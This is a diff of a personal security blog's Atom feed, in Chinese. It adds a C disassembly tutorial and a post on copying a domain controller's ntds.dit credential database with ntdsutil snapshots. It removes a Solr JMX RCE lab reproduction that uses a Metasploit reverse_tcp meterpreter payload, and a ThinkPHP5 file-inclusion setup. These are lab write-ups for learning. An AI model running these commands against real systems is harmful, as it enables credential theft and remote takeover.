@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-02-28T06:04:00.553Z</updated>
+  <updated>2020-03-04T13:09:07.850Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,56 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>C语言逆向基础</title>
+    <link href="http://sherlocz.github.io/2020/03/03/C%E8%AF%AD%E8%A8%80%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/"/>
+    <id>http://sherlocz.github.io/2020/03/03/C语言逆向基础/</id>
+    <published>2020-03-03T12:45:58.000Z</published>
+    <updated>2020-03-04T13:09:07.850Z</updated>
+    
+    <content type="html"><![CDATA[<p>C语言反汇编后的代码学习</p><p>C语言的基本数据类型：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">char1byte</span><br><span class="line">short2byte</span><br><span class="line">int4byte</span><br><span class="line">long4byte</span><br><span class="line">float4byte</span><br><span class="line">double8byte</span><br></pre></td></tr></table></figure></p><p>汇编堆栈图：<br><img src="/2020/03/03/C语言逆向基础/dzt.png" alt></p><p>从图中我们可以看出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[EBP-4n]局部变量</span><br><span class="line">[EBP+4]返回值</span><br><span class="line">[EBP+8]参数</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p><h1 id="利用vs进行反汇编"><a href="#利用vs进行反汇编" class="headerlink" title="利用vs进行反汇编"></a>利用vs进行反汇编</h1><p>首先编写好C语言代码，然后设置断点，F5编译，最后调试-&gt;窗口-&gt;反汇编(寄存器)查看我们想要的东西</p><h1 id="返回值反汇编分析"><a href="#返回值反汇编分析" class="headerlink" title="返回值反汇编分析"></a>返回值反汇编分析</h1><h2 id="char类型的返回值"><a href="#char类型的返回值" class="headerlink" title="char类型的返回值"></a>char类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/char.png" alt><br>反汇编之后我们发现，返回值保存在了al寄存器中<br><img src="/2020/03/03/C语言逆向基础/al.png" alt></p><h2 id="short类型的返回值"><a href="#short类型的返回值" class="headerlink" title="short类型的返回值"></a>short类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/short.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/ax.png" alt></p><h2 id="int类型的返回值"><a href="#int类型的返回值" class="headerlink" title="int类型的返回值"></a>int类型的返回值</h2><p><img src="/2020/03/03/C语言逆向基础/int.png" alt><br>反汇编之后我们发现，返回值保存在了ax寄存器中<br><img src="/2020/03/03/C语言逆向基础/eax.png" alt></p><h1 id="数组反汇编分析"><a href="#数组反汇编分析" class="headerlink" title="数组反汇编分析"></a>数组反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/array_1.png" alt><br><img src="/2020/03/03/C语言逆向基础/array.png" alt><br>特点：等宽连续</p><h1 id="结构体反汇编分析"><a href="#结构体反汇编分析" class="headerlink" title="结构体反汇编分析"></a>结构体反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/jgt.png" alt><br><img src="/2020/03/03/C语言逆向基础/jgtt.png" alt><br>特点：不一定等宽但一定连续</p><h1 id="if语句反汇编分析"><a href="#if语句反汇编分析" class="headerlink" title="if语句反汇编分析"></a>if语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/if.png" alt><br><img src="/2020/03/03/C语言逆向基础/iff.png" alt><br>其实if的反汇编就是jcc判断跳转到哪里的内存地址</p><h1 id="do-while语句反汇编分析"><a href="#do-while语句反汇编分析" class="headerlink" title="do..while语句反汇编分析"></a>do..while语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/do_while.png" alt><br><img src="/2020/03/03/C语言逆向基础/do_whilee.png" alt></p><h1 id="for语句反汇编分析"><a href="#for语句反汇编分析" class="headerlink" title="for语句反汇编分析"></a>for语句反汇编分析</h1><p><img src="/2020/03/03/C语言逆向基础/forr.png" alt><br>这里可以调试看的更加的清楚，首先跳转到for循环内部，然后将x的值传给eax再传给[ebp-8]也就是参数，第一次会直接跳到和y相比较，比较大小如果比y小则会跳转到printf那里，然后会[add esp,8] 这里的意思是删除栈顶的两个参数x,y，然后跳入到for循环内部，这个时候第二次进入x+1，也就是i++，后面一直循环这个操作，直到x&gt;y为止。</p><h1 id="switch语句反汇编分析"><a href="#switch语句反汇编分析" class="headerlink" title="switch语句反汇编分析"></a>switch语句反汇编分析</h1><h2 id="case-lt-3"><a href="#case-lt-3" class="headerlink" title="case&lt;=3"></a>case&lt;=3</h2><p><img src="/2020/03/03/C语言逆向基础/case3.png" alt><br><img src="/2020/03/03/C语言逆向基础/case33.png" alt><br>当我们的case情况较少的时候，发现反汇编的代码和我们if..else的反汇编代码一样，都是通过jcc比较跳转地址</p><p>##case&gt;3##<br>这里的情况复杂一些<br><img src="/2020/03/03/C语言逆向基础/case4.png" alt><br><img src="/2020/03/03/C语言逆向基础/case44.png" alt><br>反汇编的时候我们看见，首先将我们传入的参数复制给了eax，然后将eax的值给了[ebp-0C4h],最后给了ecx，然后ecx-1,最后又传回给了[ebp-0C4h]，然后这里我们与3进行比较，若比3大，则会跳转到0DA436Ah(直接跳出判断语句，因为这里switch的最大值为4,若减了1还比4大，则就会进入default)，若这个条件不成立，则会将值赋给edx，跳转到[edx*4+0DA4380h]。</p><p>这里反汇编里面搞了这么多的骚操作，原因是为了减少判断的次数直接判断出进入哪一个case，害。</p><p>当然，这里的sub并不是每次都是1，这里和你case中的数是相关的。</p><p>而switch的反汇编是非常复杂的，是编译器来进行了操作，编译器非常的聪明，这里就不一一分析了。</p><p>写的非常粗糙，害。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;C语言反汇编后的代码学习&lt;/p&gt;
+&lt;p&gt;C语言的基本数据类型：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;spa
+      
+    
+    </summary>
+    
+    
+    
+      <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Windows下ntds.dit的利用</title>
+    <link href="http://sherlocz.github.io/2020/02/28/Windows%E4%B8%8Bntds-dit%E7%9A%84%E5%88%A9%E7%94%A8/"/>
+    <id>http://sherlocz.github.io/2020/02/28/Windows下ntds-dit的利用/</id>
+    <published>2020-02-28T12:14:10.000Z</published>
+    <updated>2020-02-28T12:40:39.121Z</updated>
+    
+    <content type="html"><![CDATA[<p>ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。</p><p><img src="/2020/02/28/Windows下ntds-dit的利用/n.png" alt><br>无法直接读取</p><p>记笔记记笔记~</p><h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><ul><li>ntdsutil.exe: Windows Server 2003/08/12</li><li>vssadmin: Windows 7/Windows Server 2008</li></ul><p>这里用12的机器做示范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit//创建一个快照</span><br></pre></td></tr></table></figure><p>快照包含Windows中的所有文件，并且复制的时候不会影响Windows本机，也不会受到限制<br><img src="/2020/02/28/Windows下ntds-dit的利用/1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit//加载快照</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/2.png" alt><br>这个时候会映射出一个文件夹出来，GUID为每次生成镜像的GUID</p><p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/3.png" alt></p><p>最后删除卸载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/4.png" alt></p><p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/5.png" alt></p><p>这就是ntdsutil的用法，win7下没有这个工具，需要利用vssadmin，这里没有win7域控的环境就先不搞了<br><img src="/2020/02/28/Windows下ntds-dit的利用/win7.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/2020/02/28/Windows下ntds-dit的利用/n.png&quot; alt&gt;&lt;b
+      
+    
+    </summary>
+    
+    
+    
+      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>堆栈图练习</title>
@@ -442,48 +492,6 @@
     
     
       <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Apache Solr JMX服务远程代码执行复现</title>
-    <link href="http://sherlocz.github.io/2019/11/25/Apache-Solr-JMX%E6%9C%8D%E5%8A%A1%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://sherlocz.github.io/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/</id>
-    <published>2019-11-25T07:51:46.000Z</published>
-    <updated>2020-01-13T04:48:31.595Z</updated>
-    
-    <content type="html"><![CDATA[<p>这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li>Kali:192.168.43.141</li><li>Ubuntu:192.168.43.131<br>首先我们在Ubuntu上安装 Solr<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip</span><br><span class="line">unzip solr-8.2.0.zip</span><br></pre></td></tr></table></figure></li></ul><p>进入到bin目录下，启动Solr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/start.png" alt><br>显示这样，说明环境搭建好了</p><p>查看bin目录下的solr.in.sh<br><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/JMX.png" alt><br>看这里开启了JMX，默认端口为18983</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在kali上使用msfconsole进行攻击<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#设置exp</span><br><span class="line">use exploit/multi/misc/java_jmx_server</span><br><span class="line">set RHOST 192.168.43.131</span><br><span class="line">set RPORT 18983</span><br><span class="line"></span><br><span class="line">#设置监听</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/25/Apache-Solr-JMX服务远程代码执行复现/success.png" alt></p><p>虽然这个漏洞利用起来很方便的，但是影响范围比较小，其实也就两个版本可以利用，其他版本开启这个配置的几率也不高，留着以后有机会打吧。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这个漏洞是由于配置的时候默认开启了JMX(版本8.1.1和8.2.0)&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://sherlocz.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Thinkphp5-文件包含</title>
-    <link href="http://sherlocz.github.io/2019/11/21/Thinkphp5-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    <id>http://sherlocz.github.io/2019/11/21/Thinkphp5-文件包含/</id>
-    <published>2019-11-21T02:06:24.000Z</published>
-    <updated>2020-01-13T04:48:42.540Z</updated>
-    
-    <content type="html"><![CDATA[<p>漏洞影响版本： 5.0.0&lt;=ThinkPHP5&lt;=5.0.18 、5.1.0&lt;=ThinkPHP&lt;=5.1.10<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>composer<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.0.18 tpdemo</span><br></pre></td></tr></table></figure></p><p>然后修改其中的composer.json，修改require:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.18&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></p><p>然后更新<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure></p><p>修改 <strong>application/index/controller/Index.php</strong> 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line">use think\Controller;</span><br><span class="line">class Index extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;assign(request()-&gt;get());</span><br><span class="line">        return $this-&gt;fetch(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建 <strong>application/index/view/index/index.html</strong> ，内容啥都行，没有这个的话会报错，整了好久 ==</p><p>然后在public目录下新建一个test.php，内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>访问url: <a href="http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php" target="_blank" rel="noopener">http://127.0.0.1/tpdemo5.0.18/public/?cacheFile=test.php</a><br><img src="/2019/11/21/Thinkphp5-文件包含/phpinfo.png" alt></p><p>这样就好了，接下来我们分析跟踪漏洞的成因</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;漏洞影响版本： 5.0.0&amp;lt;=ThinkPHP5&amp;lt;=5.0.18 、5.1.0&amp;lt;=ThinkPHP&amp;lt;=5.1.10&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://sherlocz.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
   </entry>
   
